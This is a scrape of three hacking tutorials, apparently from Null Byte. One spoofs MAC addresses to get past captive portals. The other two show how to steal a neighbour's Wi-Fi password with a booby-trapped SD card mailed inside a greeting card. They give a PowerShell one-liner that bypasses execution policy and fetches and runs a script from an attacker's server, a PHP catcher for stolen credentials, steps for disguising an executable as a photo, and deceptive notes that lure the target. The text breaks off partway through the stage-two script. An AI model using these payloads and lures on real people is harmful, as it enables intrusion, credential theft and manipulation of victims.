Wi-Fi access point to differentiate between wireless devices trying to join the network. Fortunately for a hacker, it is also exceedingly easy to change or spoof the MAC address of a Wi-Fi device. A MAC address is supposed to be a unique address set by the manufacturer to identify a piece of hardware to a network and to other devices, but in practice, assuming the MAC address is always truthful isn't a good idea.\nTaking Advantage of This Security Loophole\nBy simply scanning the local area with tools like Kismet or Airodump-ng, a hacker can easily see every open Wi-Fi network nearby, as well as any clients connected to it. This clearly reveals the MAC address of any device exchanging data with a network, which is an indication that it has already authenticated successfully.\nDon't Miss: Getting Started with the Aircrack-Ng Suite of Wi-Fi Hacking Tools\nHacking class: Students using Kismet and external wireless cards to scan for Wi-Fi devices. Image by Kody/Null Byte\nNext, comes MAC spoofing. A simple command line tool like GNU MAC Changer is then able to swap out the hacker's MAC address for one discovered to already be connected, allowing them to connect to the network disguised as the trusted, authorized device, granting them the same level of access.\nAfter successfully spoofing the MAC address, the hacker can obtain network access without authentication or even paying a fee. Another scenario is when a hacker will add a small surveillance device or camera to a public Wi-Fi network which, by itself, would not have the ability to authenticate through a portal the way some open networks require to connect.\nIt's worth noting that most of these network types prohibit devices from communicating with each other directly by restricting each device to its own subnet, so don't think you'll be able to add a Raspberry Pi and SSH into it directly from a coffee shop hotspot. In spite of this limitation, the ability to get free, unfettered access to information is a critical skill for a hacker, and using this trick can get you a data connection in urban areas without the need for much infrastructure.\nDon't Miss: How to Wardrive on the Kali Raspberry Pi to Map Wi-Fi Devices\nWhat You'll Need\nThis is a relatively simple tactic, but you'll need a couple important capabilities to pull it off. First, you'll need the ability to change your MAC address, which can be accomplished via a program like GNU MAC Changer, as already discussed. This is pretty easy on just about every system, but especially Linux and macOS.\nNext, you will need to be able to find and listen in on wireless networks nearby. Kismet can be run on Linux or macOS to scan a wide area, but other Kali-specific tools like Airodump-ng allow for precise and lightweight targeting. Either will work.\nUsing a Panda PAU 09 and a TP-Link to scan wireless networks nearby with Kismet. Image by Kody/Null Byte\nIn most cases, you'll need a wireless network adapter which can be put into wireless monitor mode, or promiscuous mode, unless your existing card supports this. While Kismet can enable this mode on macOS wireless cards, we recommend a Kali-compatible wireless network adapter like the $16 PAU05 to be able to run all the wireless monitoring tools at your disposal.\nDon't Miss: The Best Wireless Network Adapters for Wi-Fi Hacking\nStep 1: Install the Needed Tools\nAs always, make sure your Kali system is updated by running apt-get update in a terminal window. Next, ensure you have the correct tools by running apt-get install macchanger aircrack-ng. This will ensure the installed version of both programs is up to date, and it will install the most current version if it is not present.\nIncluded in the Aircrack-ng package is Airodump-ng, our reconnaissance tool of choice for this tactic. We can also use Kismet, but the simple filters on Airodump-ng make it lightweight for this application. If you'd rather use Kismet, you can check out my article on wireless surveillance using Kismet at the link below.\nMore Info: How to Use Kismet to Watch Wi-Fi User Activity Through Walls\nStep 2: Verify the Open Network's Security\nBefore going any further, connect to the open network in question and verify that there is some sort of security to get through.\nIn my example, I'm examining an open (meaning no password) public Wi-Fi network that is free for cable subscribers. Upon connecting, my device is assigned an IP address, but I'm not able to access the internet. I tested this by checking to see if my pings can get through to the internet, as seen below.\nMy packets never hit the internet, so I'll need to open a browser window to see if there is a captive portal to be directed to in order to sign in and access the internet. As is typical for these kinds of networks, attempting to load any webpage will simply load the same captive portal page requesting login credentials every time.\nOpen Firefox, enter a URL to navigate to, then you should be redirected to the portal.\nA captive portal page, which we are redirected to every time we try to access the internet.\nStep 3: Get into Monitor Mode\nNow that you've confirmed you have a captive portal likely using a MAC address, it's time to find someone already allowed to join the network. First, get your tools in order. Plug in your wireless network adapter, and use ifconfig to see the name your computer assigns to it. It should be something like wlan0 or wlan1.\nOnce you have the name of your interface, you'll need to put the card into monitor mode to explore the area. To do this, enter the following in a terminal window.\nsudo airmon-ng start CardNameip a\nThis should put your card into monitor mode, and then display a list of the networking devices attached. If your card was successfully put into monitor mode, it should have been renamed to include \"mon\" at the end of the card. Thus, if you were working with a card called wlan0, it would change to wlan0mon.\nStarting the wlan0 card into monitor mode. Image by Kody/Null Byte\nCopy the name of the card that's been placed into monitor mode, as you'll need it for the next command.\nStep 4: Scan & Filter for Encryption Types\nTo scan the entire area for open networks, you'll use Airodump-ng with a single argument. In a terminal window, type the following command, making sure to change \"wlan0mon\" to the name of your wireless card.\nsudo airodump-ng wlan0mon --encrypt OPN\nThe --encrypt OPN allows us to specify that we only want to see nearby open networks. We should see a list of all open networks in range on all channels.\nThis list may be quite large, so you'll need to filter it further to be useful. Let this run for awhile and look for a few key things: data transfer and clients. Your card will be scanning all channels by default, so it will be skipping around quite a bit while doing so. You can see client devices (laptops, cell phones, and other Wi-Fi devices) listed in the table on the bottom.\nWhile doing so, it will begin to show you if data is being transferred on the network, or if only \"beacons\" are being transmitted. Beacons are automated packets that are sent out many times each second to let nearby devices know it's available to connect to, and they don't mean anything interesting. Data, however, means there is likely someone on the network. Sometimes it may be hard to see this while skipping around on different channels. Hit Ctrl + C to stop the scan.\nStep 5: Target an Individual Channel & Client\nTo keep your card on one channel, select the channel with the most open networks on it. Since most of the ones seen in my example are on channel 5, I can add -c 5 to my command to make it stay on channel 5. This, however, will show many unassociated devices, which are things like laptops or smartphones that aren't yet connected to a Wi-Fi network.\nSince you're looking for connected devices that have already gotten through the MAC address filter, you'll need to add another argument to show only associated (connected) devices. Below, you can see the output of re-running the previous command with the -c 5 flag to only show networks on channel 5.\nTo construct the filter to find a connected user, add the -c 5 flag to specify channel 5, and -a to ignore any clients that aren't currently connected. Making sure to change the channel number to that of the network you're targeting, run the following in a terminal window.\nsudo airodump-ng wlan0mon -c 5 --encrypt OPN -a\nNow, stay on a single channel and focus on associated clients. Below, you can see I am detecting data use on the last of three detected open networks on my chosen channel. The output in the lower half of the screen shows connected clients, and it's obvious this network has three connected clients. This is the data needed to get into the network.\nTarget data showing nearby open networks and associated clients.\nTo confirm that these clients are connected to \"CableWiFi,\" you can also see a \"probe\" frame from the client device looking for the \"CableWiFi\" network. This means it has connected to the network before and is looking for it to connect again. You can also see that the connected \"BSSID\" of these clients matches the \"CableWiFi\" BSSID, meaning the three MAC addresses listed each are associated with the target network.\nSince one client (the last one in my example) has significantly more frames sent over the network than the others, I can assume the last client is using the most data and represents the best target to pretend to be.\nNote the MAC address that you select, as it is your key to the network.\nStep 6: Get into Station Mode\nNow, you can take your card out of monitor mode and back into station mode. To do this, type sudo airmon-ng stop wlan0mon, replacing the interface name with the name of your card. This should change the card name and remove the \"mon\" at the end. Run ip a again to confirm the new name of the card.\nOnce it's in station mode, you will need to bring the card down in order to change the MAC address. You can do this by typing sudo ifconfig wlan0 down. Again, make sure to replace wlan0 with the name of your wireless card.\nStep 7: Disguise Yourself as a Connected Client\nOnce your card is down, you can use MAC Changer to change its MAC address. This is done by typing the following into terminal.\nsudo macchanger -m TheNewMACaddressTheNameOfTheInterface\nOnce this change is made, bring the card back up by typing the following command, and then try reconnecting to the target network.\nsudo ifconfig wlan0 up\nWith your cloned MAC address, you can connect to the network your target device is connected to. Immediately, you should see a difference from connecting earlier with your genuine MAC address — suddenly, your pings are going through, and you'll be able to load websites without being redirected back to the captive portal!\nSuddenly, our pings start to break through, and we're able to start loading webpages!\nIt's important to note that the other device on the network may suddenly have a difficult time connecting to the network due to an IP collision. This is caused when two devices with the same MAC address are on the same network and are assigned the same IP address. Because of this, you should be careful about using this technique, as it could constitute unauthorized access to a network and denial of service of the user who's MAC address you're borrowing.\nOther Uses for MAC Address Spoofing\nTo add an IoT device, or any other device not able to click through a captive portal, the process is extremely straightforward. Rather than spoofing the address of an existing device, you can simply spoof your MAC address to that of the device that you want to add to the network. Once you've gone through the portal and your MAC address is added to the whitelist, you can change your MAC address back and connect your IoT device without any hassle.\nDon't Miss: Using Netdiscover & ARP to Find Internal IP and MAC Addresses\nSince you've manually added the MAC address to the open network's MAC filter, it should be able to connect to the internet directly with no issues. Keep in mind that most open networks restrict users to their own subnet, so just don't expect to be SSHing into your device over the local area network. Your MAC address will revert to the original when you restart, so you can change it back through MAC Changer or by restarting when you're done spoofing your address.\nDefending Against MAC Spoofing\nSince MAC addresses can be spoofed so easily, it's generally not advised to use it for any application that requires real security. While MAC address filtering can prevent an unskilled attacker from connecting a device, anyone with basic knowledge of wireless recon would find it trivial to bypass such a network restriction.\nIt's far more secure to require a password to connect and restrict a user to their own subnet, rather than maintaining an open network with a captive portal using MAC address filtering.\nDon't Miss: How to Crack Weak Wi-Fi Passwords in Seconds with Airgeddon on Parrot OS\nI hope you enjoyed this guide to bypassing MAC address-based security in open networks! If you have any questions about this tutorial or how MAC address spoofing works, feel free to leave a comment or reach me on Twitter @KodyKinzie. We'll be exploring more Wi-Fi hacking techniques, so stay tuned.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack Anyone's Wi-Fi Password Using a Birthday Card, Part 2 (Executing the Attack)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-anyones-wi-fi-password-using-birthday-card-part-2-executing-attack-0183062/",
        "content": "* WonderHowTo\nIn the previous article, we learned how to set up our VPS, configure our PHP server, and developed an in-depth understanding of how the payload works. With all that taken care of, we can get into disguising our payload to appear as an image and crafting the note in the greeting card being delivered to our intended target.\nTo elaborate slightly, we'll convert the \"Stage 1\" payload we learned about last time into an executable and modify its icon to make it appear to be a normal JPG image. With that out of way, the only thing left to do is put an enticing note in the greeting card and send it out along with the SD card or USB flash drive. After that, we just sit back and relax and wait for the information to hit our PHP server.\nPreviously: How to Hack Anyone's Wi-Fi Password Using a Birthday Card, Part 1 (Creating the Payload)\nAs always, we'll include a section at the end of this guide on how you can lessen your chances of falling victim to a Wi-Fi attack like this. We're not black hats, after all, and this hack is just an exercise to help develop our pentesting and/or white hat skills, and to help educate the general public about hacks that can affect them.\nStep 1: Find Photos for the Storage Device\nWe'll need to populate the SD card (or USB drive) with at least one real photo to make this attack work. Clicking on one payload executable will open one real photo on the SD card, in addition to stealthfully grabbing Wi-Fi passwords, so that it looks like the executable itself is that photo.\nIt will be possible to have multiple real photos on the SD card and have each payload open a different photo. This will help disguise the attack and prevent the target user from being suspicious of \"photos\" that don't actually open.\nDepending on what social engineering angle you take when writing a message in the card, these images can be random vacation photos, adorable puppies, or photos of a person you believe the target will find attractive.\nWhatever you choose, make sure the images are perfectly even squares and as large as possible. Ideally, an image with the aspect ratio of over 720 x 720, like the square images found on Instagram, will create a perfect icon file. Any uneven or small aspect ratios will cause the icon file to appear with an unusual amount of whitespace around the icon and may cause your attack to fail.\nDon't Miss: How to Hide Secret Data Inside an Image or Audio File in Seconds Using Steganography\nI'll use a single photo of a fat cat, but you can do this with as many different photos as you like. The more photo/payload pairs you create, the more likely the target will become curious and begin clicking on files.\nStep 2: Save the Photos to the Storage Device\nOnce you've found a photo you want to use, save it to the SD card (or USB flash drive). Doing it this way will intersperse real photos with our payloads, but this will result in duplicate photos showing up — the real photo and our fake photo with the payload.\nIdeally, hide the real photo(s) on the storage device. Windows doesn't display hidden files by default, so there's a good chance your target will not be able to see any files you hide on the device. It would be beneficial to hide the real photos and make only payloads accessible to the target.\nTo hide photos using Windows, right-click on the photo, view the \"Properties,\" then check the \"Hidden\" attribute followed by \"OK.\"\nCat image found at Flickr by Charles Nadeau (CC BY 2.0).\nStep 3: Convert the Payload Photo into ICO Format\nNow that we have a least one image, we can convert the JPG into an ICO format. ICO is an icon file format used by the Windows operating system to display small icon images. To do the conversion, I recommend using ICO Converter online.\nAfter navigating to the ICO converter website, click the \"Browse\" button to select the photo you wish to convert and be sure to check all of the size (pixels) options available. If you don't check all of them, there's a chance the ICO produced will have an unnecessary amount of whitespace around the icon and cause the image to appear malformed.\nThen, click the \"Convert\" button. After a moment, you'll be asked to save the new ICO. Save it to the Downloads folder on your computer — don't save it to the SD card accidentally. We still have to build the PowerShell script into an executable payload that will use this new icon image as well as the photo already on the storage device.\nDon't Miss: Creating an Invisible Rogue Access Point to Siphon Off Data Undetected\nStep 4: Install a BAT to EXE Converter\nTo convert PowerShell scripts into executables, we'll be using a Windows program called BAT to EXE Converter (B2E), which will also allow us to change the icon of the executable to make it appear as an image file.\nI urge readers to use B2E in an offline, sandboxed, or disposable Windows OS virtual machine. B2E was flagged by VirusTotal as being a potentially malicious file. There are many virtual Windows machines at my disposal, so I didn't hesitate to try this program. And being a determined hacker, I'll use whatever program necessary to achieve my goal. B2E may be dangerous or harmful to your computer. Install and use with caution.\nTo install the program, head over to the B2E download page, complete the CAPTCHA, and click the big \"Download\" button. The F2KO (the developer) website uses a modern CAPTCHA system, which requires you to allow the website temporary use of your computer's CPU to mine cryptocurrency. The CAPTCHA process will cause your CPU to spike dramatically while the crpyto-miner is working. When the B2E download is completed, simply close the browser tab to stop the miner.\nIf you're not comfortable letting the F2KO website use your CPU in exchange for the B2E software, you can download the B2E .zip from my GitHub page where I'm currently hosting a download mirror.\nAfter acquiring the \"Bat_To_Exe_Converter.zip\", open the archive, and click on the \"Bat_To_Exe_Converter_(Installer).exe\" to start installing B2E. The B2E installer will ask you to select your preferred language, agree to the license agreement, and select an installation destination. Continue clicking \"Next\" until the installer is complete, and B2E will open automatically.\nStep 5: Convert the Stage 1 Script to EXE\nCopy the below \"Stage 1\" script into the B2E window that pops up. We discussed this script in detail in the last article, if you need to refresh your memory.\npowershell -ExecutionPolicy Bypass \"IEX (New-Object Net.WebClient).DownloadString('http://YOUR-VPS-IP-HERE/payload.ps1');\"\nRemember to change the \"YOUR-VPS-IP-HERE\" address to the IP address of your VPS running the PHP server.\nThen, click the \"Save\" button and name the file whatever you like — it won't affect any part of the hack. I'll name it as \"tokyoneon.\" Check the \"Icon\" option, select the image ICO we created earlier in Step 3, and use \"64 Bit | Window (Invisible)\" as the Exe-Format option. The \"Invisible\" option will prevent any cmd terminals from popping up when files on the SD card (or USB drive) are opened.\nNext, click on the \"Convert\" button to create the executable. You'll be asked by B2E to select a save destination. Save the newly converted EXE to the SD card (or USB drive), and you're done!\nThis payload will just send a request for our Stage 2 payload located on our PHP server, which will look for the storage device name and the real photo on the storage device, then show them the real photo when clicking the image while sending back their Wi-Fi credentials to us on the server.\nStep 6: Pick the Right Greeting Card\nThere's a good chance you've needed to purchase a greeting card for a friend, coworker, or relative at some point in your life. Buying a greeting card for your intended target and using it to deliver the SD card (or USB drive) and your payload isn't too different. Ask yourself: what kind of greeting card would they buy for themselves?\nThere will likely be many greeting card options available to you. The kind of card and note you leave for the intended target will likely rely heavily on your casual day-to-day observations of them.\nImage by niloo138/123RF\nWhen you last saw your neighbor, were they out walking their dog? A greeting card covered in impossibly cute puppies might be well suited for them.\nIs your intended target a 25-year-old male who sometimes brings home different girlfriends? A romantic or Valentine's Day card containing some suggestive text might be a better fit.\nUnfortunately, the observations we make of our neighbors will likely be very shallow and we may find ourselves relying on unfair stereotypes. Try to be as observant as possible and choose the greeting card that will most likely invoke strong feelings of excitement and curiosity in your target.\nStep 7: Fill Out the Greeting Card (Optional)\nWhat's written on the greeting card needs to be believable enough to seduce the target into wondering what content is on the SD card (or USB drive). The writing on the card can be very minimal, just one or two sentences, but keep in mind how you are planning to send the card later. If you are targeting them directly, use their name but make sure to do enough research on them to make sure what you say makes sense. If you mention their kid's name, it better be their real kid's name.\nHowever, you could also try to go the random route, and not mention any names on the card or envelope. They will likely still open it, and they might even be more enticed to look into what's on the storage device. You could also try using the wrong name on the envelope and in the card, but it's a federal crime to open someone else's mail, so this will likely not happen unless they think money is in the card.\nDon't Miss: How to Extract Email Addresses from an SMTP Server\nBelow is an example intended for a birthday card. If you found that your target's birthday is coming up or just recently happened, this will work like a charm, especially if you know their kin's name, but if not, it'll be pretty suspicious.\nHappy Birthday! Sorry, we couldn't visit this year. Hope all your bday wishes come true!\nP.S. The kids put a little surprise for you on the SD card!\nEnd the card with the remark about the SD card (or USB drive). It's better to be vague and make the content on the storage device a mystery. Let that be the last thing your target reads so that it's fresh in their mind when they put the greeting card down.\nBelow is another example probably better suited for the \"hopeless romantic\" type.\nHey Andrew,\nI'm sorry for everything and wish we could be together again. Maybe someday you can forgive me? I put something special for you on the SD card...\nLove,Stephanie\nThe goal is to illustrate some interesting or dramatic scenario that will spark a curious itch in your target's mind that can only be satisfied by inserting the SD card into their computer. Maybe Andrew parties a lot and can't remember whom he brings home at night, so this might do the trick.\nYou could also forgo any message in the greeting card, but that could warn them to our maneuver. Who gets a greeting card without anything written on it?\nStep 8: Deliver the Goods\nWith our VPS hosting our Stage 2 PowerShell payload and PHP server, our greeting card inscribed with a convincing handwritten note, and our SD card (or USB drive) containing the Stage 1 PowerShell payload/s, it's time to put it all together and deliver the greeting card to our intended target. We have two options here.\nOption 1: Drop the Card Off Directly\nNot using a paid mail service would certainly expedite the process. After all, it seems silly to actually mail the package to your target, especially if your target is a neighbor in the apartment next door. Just place the envelope above or near the intended target's mailbox where they're most likely to see it.\nHowever, doing this is dangerous. The package would be clean — too clean. Have you ever received a package in the mail that wasn't corroded, dirty, or mishandled? It also wouldn't receive an official stamp from the post office legitimizing its process through the mailing system. Delivering the package like this will likely arouse suspicion and give your target reason to believe the attacker is local and nearby.\nOption 2: Mail the Card & Wait\nTo maximize the potential for success, place a postage stamp on the package, drop it in a mailbox, and wait 3–10 business days for it to be delivered to your target. This way, the package will be properly processed by the mailing services, stamped, and adequately battered while en route to its destination. The mailman might even hand-deliver the package to the intended target. This will go a long way in creating a sense of legitimacy.\nThe major downside to taking this approach is the week you'll need to wait before the target receives the package. It's riskier, but be sure not to include a return address on the package. If the package is rejected, lost in the mail, or for some reason isn't able to be delivered to your target, you'll simply need to count that as a failed attempt.\nDon't Miss: How to Use Kismet to Watch Wi-Fi User Activity Through Walls\nWhen you're ready to send the package to your targets home, don't address the package to any one person. Only include the delivery address on the center of the envelope. This will hopefully arouse curiosity, and it's no crime to open it, since and it's a letter addressed to their address with no name. If you performed advanced recon and found out their name and other personal details, it's better to go with the name approach.\nStep 9: Find Their Wi-Fi Credentials\nWith a little luck, your target clicked on a payload. Back on your VPS, a new file containing their Wi-Fi credentials would have been created. SSH back into your VPS and change into the phpServer directory as we did in the first article when testing the PHP server. Use the ls and cat commands to view and read files in the phpServer directory.\nNo Payload Is Perfect\nThis PowerShell attack isn't perfect. If the target device is using an Ethernet cable to connect to the router, the above PowerShell payload won't work. If the target device is not connected to the internet, there's no contingency or redundancy built-in to the payload that forces a connection to the internet; the HTTP request will fail and the Wi-Fi credentials will not reach your VPS. And, of course, if the target inserts the SD card into their digital camera or smartphone, they'll be able to view hidden photos but won't be able to execute the payloads.\nIt's also worth noting that every day this article is online, this attack becomes less and less effective. Thousands of Null Byte readers begin using similar PowerShell payloads and uploading them to virus scanners like VirusTotal, a public database of malware which distributes payloads and detection information to major antivirus companies around the world. This is harmful to the success of such hacks. This is the cat-and-mouse game hackers play with antivirus software companies.\nThere may never be a perfect payload for compromising a computer. If you know a more effective payload method than the PowerShell method featured in this article, feel free to use that payload with the social engineering greeting card trick.\nDon't Miss: Get Anyone's Wi-Fi Password Without Cracking Using Wifiphisher\nHow to Protect Yourself\n* Don't insert strange SD cards or USB flash drives into your computers. It seems obvious, but it has to be said. If you find a strange storage device in a public place, on the ground, or even in your bag or home — don't trust it.\n* If you really can't help but find out what content is on a storage device, use an isolated and offline computer — not your primary or favorite laptop.\n* If you're using Windows, use the \"Detailed\" layout view in the File Manager. This will display file type information and may help you spot strange or suspicious file types.\n* If you're using Windows OS, make sure file type extensions are not \"Hidden\".\n* Don't open packages in the mail that are not directly addressed to you — no matter how big or small.\n* Share this article. It seems silly, but public awareness can go a long way. If more people understood how far hackers will go to compromise a wireless network, they might be more suspicious of strange items arriving in the mail.\nThe Cost of This Wi-Fi Hack\nThis kind of attack is by no means a quick solution for compromising someone's Wi-Fi network. This hack can take hours to set up and days to go from configuring the server to executing the payload. Only a very patient, methodical, and determined hacker would exercise this kind of attack. And let's not forget the financial cost of all of this.\n* greeting card: $4–$9\n* postage: about $2\nThe moral cost is more difficult to gauge. This article is a lot different from other content online you'll find related to Wi-Fi hacking. Some readers might define this method as extreme, overkill, invasive, or creepy — and they would be correct. Many social engineering tactics and techniques go far beyond \"unethical.\" At least now we know what kinds of devious tricks attackers might use to gain access to our home or work networks and what we can do to better protect ourselves.\nI'm curious to know what social engineering tricks readers have to offer. How do you feel about using a greeting card as a payload delivery system? Leave your comments below.\nAnd until next time, you can find me on the darknet.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack Anyone's Wi-Fi Password Using a Birthday Card, Part 1 (Creating the Payload)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-anyones-wi-fi-password-using-birthday-card-part-1-creating-payload-0183043/",
        "content": "* WonderHowTo\nWith an ordinary birthday card, we can introduce a physical device which contains malicious files into someone's home and deceive them into inserting the device into a computer.\nIn my last series, we used a Post-it note to trick a neighbor into visiting a website that we control. This kind of attack required a lot of reconnaissance to successfully identify the neighbor's name. It also required the target user to manually download a file to their computer. The other potential downside to the attack is that the target may become aware that they're the center of attention.\nWe generally want to compromise a target in as few steps as possible, so asking our intended target to visit a website and download a file and open the file might be a stretch depending on how technically savvy they are.\nDon't Miss: How to Hack Your Neighbor with a Post-It Note\nThis time around, we'll take things a step further and learn how to get a physical device past someone's front door and into their home with just a few tricks, and we'll simplify the payload process by including it in the delivery.\nUnderstanding This Greeting Card Attack\nLet's first take a look at the attack scenario overview to better understand how this hack works. Our goal is to social engineer someone into inserting an SD card into a computer. This can easily be done against our neighbors next door. When the fake \"photo\" we make on the SD card is opened, our payload will execute, collect the device Wi-Fi credentials, and send the data to a server that we control.\nHowever, not all computers come equipped with SD card slots, and not everyone has an external card reader or digital camera that can act as one. It's certainly possible to substitute the SD card with a USB flash drive, but it's not unusual to assume there are pictures on an SD card as all popular digital cameras use them.\nIn the first part of this series, we'll start with a bit of hardware reconnaissance. It's always important to do some kind of hardware recon before creating a payload. This will help us decide what kind of operating system we're most likely up against. Then, we'll create a payload on an SD card and set up a Virtual Private Server (VPS) to receive the Wi-Fi credentials.\nIn the second part of this tutorial, we'll convert the payload to an executable and modify the icon to make it appear to be a normal JPG image. When that's done, we'll talk about inscribing a greeting card with an enticing note to trick the target into opening files on the SD card, then discuss when and how to deliver the card, as well as protections you can utilize to make sure you don't fall victim to this attack.\nThe real-world applications for this kind of attack are limitless. Using a greeting card or any kind of personalized delivery system to social engineer a target into inserting a device into their computer can be used against major corporate companies, small businesses, and average everyday computer users. Last month, Taco Bell showed how a bare manila envelope was enough to get someone to insert a USB drive into their computer, but we're going to have some fun here.\nStep 1: Discover Their Hardware Information\nIdentifying devices connected to the target wireless network is important to the success of this attack and has been covered several times on Null Byte before. I suggest using the Airodump-ng method I showed in the Post-it note hack, but you can also use the Kismet method to monitor hardware and enumerate operating systems connecting to the network. Once you have some MAC addresses, you just need to check them online to see what manufacturers they match up with.\nMore Info: How to Use Airodump-ng to Find Hardware Information\nA Dell or Hewlett-Packard MAC address would be a strong indicator of a Windows computer on the network. If many Apple MAC addresses are discovered, then there are probably MacBooks and iPhones connecting to the network. In that scenario, you would have to generate some kind of Apple-specific payload. For the remainder of this article series, we'll focus on targeting Windows computers as Windows is the most popular desktop operating system in the world.\nStep 2: Find the Right Storage Device\nFor the payload used in this tutorial, a small 128 MB SD card will be more than adequate. If you're using the social-engineering method in this article but are opting to use your own custom payload type, be sure to use an SD card appropriately sized to meet your needs. If you're using a USB flash drive, 1 GB would be enough, if you can even find one that small by itself.\nWhen testing this hack, I used a very cheap and generic microSD card which was collecting dust on my desk. Remember, we'll never use or see this SD card again so don't break the bank trying to get something high-end.\nIf you believe your target is tech-savvy and would understand the difference between a cheap and high-end SD card, you won't be able to convince them there's an interesting 4K video on a 128 MB card. It's just not possible. In that case, you might have to invest in something higher quality to keep your imaginary social engineering scenario in the realm of probable. Also, if you use a microSD card, as I did, remember to include an SD card adapter as shown in the image below.\nImage by tokyoneon/Null Byte\nMicroSD cards are smaller and most computers and laptops don't support microSD slots, so be sure to include an adapter. Cameras and smartphones will likely have a microSD card slot, but these are not our target devices, though, they can be used as an impromptu card reader, though it's unlikely they would be used that way.\nStep 3: Give the Storage Device a Unique Name\nWhen you insert the SD card or USB drive into your computer for the first time, it will likely be named automatically to something generic. Rename your storage device to something very unique like \"SanDisk07595,\" \"HAPPY_BDAY,\" or something relevant to what you will write in the greeting card. This will allow the payload to easily locate the drive letter of the storage device when it's inserted into a computer.\nIf the storage device name is too generic like \"SD,\" and there's already a device named \"SD\" connected to the target computer, it will cause complications when executing the payload. Be sure to give the SD card a memorable unique name.\nIn Windows, you can change the name of connected SD card or USB drive by right-clicking on the device and clicking \"Rename.\" On a Linux system, open up the \"Disks\" application, select the drive, click on the cogs icon, then \"Edit Filesystem.\" For this tutorial, I'll be using images of cats, so I'll name my SD card \"CATZ.\"\nStep 4: Set Up Your VPS\nIn order to get the Wi-Fi credentials from our payload that we're making, we'll need a VPS to receive and store the data. There are plenty of VPS providers available across the web, such as OVH, VPSdime, VPS.net, and Vultr, but I'll be using DigitalOcean. If you're more comfortable with another VPS provider, feel free to set up a Debian or Ubuntu VPS using your preferred provider.\nDigitalOcean's cheapest $5/month plan will work just fine for this hack. To connect to your new DigitalOcean server, enter the below ssh command into a terminal window.\nssh root@Your-VPS-IP-Here\nNow that we have our VPS up and running, we'll need to install PHP. This will allow us to create a simple PHP server to receive or \"catch\" the credentials after they've been sent from the compromised computer.\nTo install PHP, run the apt-get command below.\nsudo apt-get update && sudo apt-get install php\nSome distributions force install Apache along with PHP, so be sure to stop any web servers that might be running after installing PHP.\nsudo apachectl stop\nWith that done, we can start our PHP server. We'll need this server running 24/7 to host our payload and receive the Wi-Fi credentials when someone opens a file on the SD card or USB drive. To start, make a directory called \"phpServer\" using the below mkdir command.\nmkdir phpServer\nThen, we'll change into the phpServer directory using the cd command, and create a file called \"index.php\" using nano.\ncd phpServernano index.php\nWe'll then paste the below PHP script into the nano terminal. Once that's done, to save and exit the nano terminal, press Ctrl + X, then Y, then Enter.\n$file = $_SERVER['REMOTE_ADDR'] . \"_\" . date(\"YmdHisms\") . \".credz\";\nfile_put_contents($file, file_get_contents(\"php://input\"));\nThis is a very simple PHP server and you don't need to modify a single line for it to work. When our payload is executed on the compromised device, it will send the Wi-Fi credentials to this PHP server and be automatically saved to a \".credz\" text file.\nTo start the PHP server, use the below command.\nsudo php -S 0.0.0.0:80 &\nThe -S tells PHP to start a web server, while 0.0.0.0 tells PHP to host the server on every interface on the VPS. Doing this will allow any device in the world to access files hosted on our PHP server. The 80 is the listening port number. By default, all web server and browsers use port 80 with HTTP servers. To keep the server from stopping when we kill our SSH connection, we'll use & at the end of the command to tell the terminal to start the PHP server to a background process. This is the quick and dirty way of keeping our server online long after we close our SSH session.\nTo verify your PHP server is working, you can use the below cURL command from any Unix-like computer in the world.\ncurl --data \"tokyoneon was here!\" http://Your-VPS-IP-Here/index.php\nThe --data argument will send the \"tokyoneon was here!\" text to the PHP server similar to how the payload sends Wi-Fi credentials. Of course, this can say anything you want. After you run the cURL command, there should be a newly created file in the phpServer directory. Use the cat command to read the file contents as I did in the above screenshot.\nThat's as far as we'll go with the VPS for now. We'll come back in a bit, as we need to save the payload to the phpServer directory.\nStep 5: Understand How the Payload Will Work\nLet's begin talking about the payload and have a look at what the target user will see when they view content on the SD card or USB flash drive enclosed in the greeting card package. One of the \"fatcat\" photos in the below GIF is a malicious file I created and modified to appear as a normal photo. Can you tell which file is a real photo and which is a payload?\nCat image found at Flickr by Charles Nadeau (CC BY 2.0).\nClicking on either the real cat photo or the payload will cause the cat photo to open. The Windows operating system, going as far back as Windows XP, hides file extensions by default. At a glance, it's not possible to determine whether the files we're looking at are actually image types or executables. This is possibly one of the greatest design flaws of the Windows operating system and a security issue that may never be properly addressed.\nIt's possible to change the default file manager layout, however. Viewing the files using the \"Details\" or \"Content\" layout will show one of the images as an application. The 6 other file manager layouts will not display information that would indicate the executable is not actually an image. Even still, some people might not even pay attention to the file types being displayed right in front of them.\nWhat Is PowerShell?\nPowerShell is a scripting language that Microsoft developed to help IT professionals configure systems and automate administrative tasks. Hackers have been using and abusing PowerShell to achieve their goals since 2006 when it was introduced into the Windows XP and Vista operating systems.\nThe executables (or fake photos) on the SD card or USB drive will contain \"Stage 1\" of the attack. The first stage is a simple PowerShell one-liner that invokes an HTTP request and downloads the larger PowerShell script (\"Stage 2\") from our VPS. The larger script is the actual payload that grabs Wi-Fi passwords and sends them to our VPS.\nDon't Miss: Getting Started with Post-Exploitation of Windows Hosts Using PowerShell Empire\nThe PowerShell payload featured in this article is different from the HTA payload used in our previous Post-it note hack. This payload requires minimal user input for the payload to execute. The target user does not need to click \"OK\" or allow any special UAC conditions. Simply double-clicking on the fake \"image\" will invoke the PowerShell script.\n1. What the Stage 1 Script Looks Like\nHere's what the \"Stage 1\" script looks like, the one that will be loaded onto the storage device that the target will receive:\npowershell -ExecutionPolicy Bypass \"IEX (New-Object Net.WebClient).DownloadString('http://YOUR-VPS-IP-HERE/payload.ps1');\"\nIt's very simple and small. All it does is fetch and automatically execute the larger PowerShell script being hosted on our VPS.\nWindows operating systems sometimes have restrictive PowerShell execution policies which can cause our scripts to fail. This creates a small obstacle for hackers and systems administrators alike. Fortunately, there are many ways of bypassing this. The -ExecutionPolicy Bypass argument used in the \"Stage 1\" PowerShell script will allow us to easily bypass any execution policies enabled on the target device.\n2. What the Stage 2 Script Looks Like\nHere's what the larger, \"Stage 2\" script looks like:\nAdd-Type -AssemblyName System.Web;\n$SDname = (gwmi win32_volume -f 'label=''SD-CARD-NAME-HERE''').Name;Invoke-Item -Path (\"$SDname\" + \"REAL-IMAGE-NAME-HERE.png\");\nForeach ($path in [System.IO.Directory]::EnumerateFiles(\"C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\",\"*.xml\",\"AllDirectories\")) {\nTry {$oXml = New-Object 